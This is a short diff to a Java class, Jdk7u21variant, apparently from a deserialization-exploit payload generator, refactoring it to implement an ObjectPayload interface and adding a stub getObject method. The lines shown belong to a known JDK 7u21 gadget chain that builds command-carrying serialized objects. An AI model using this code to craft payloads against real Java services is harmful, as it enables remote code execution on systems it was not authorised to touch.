@@ -12,9 +12,9 @@ import java.rmi.MarshalledObject;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
 
-public class Jdk7u21variant {
+public class Jdk7u21variant implements ObjectPayload<Object>{
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         Object templates = Gadgets.createTemplatesImpl(type, param);
         String zeroHashCodeStr = "f5a5a608";
 
@@ -50,5 +50,10 @@ public class Jdk7u21variant {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 }
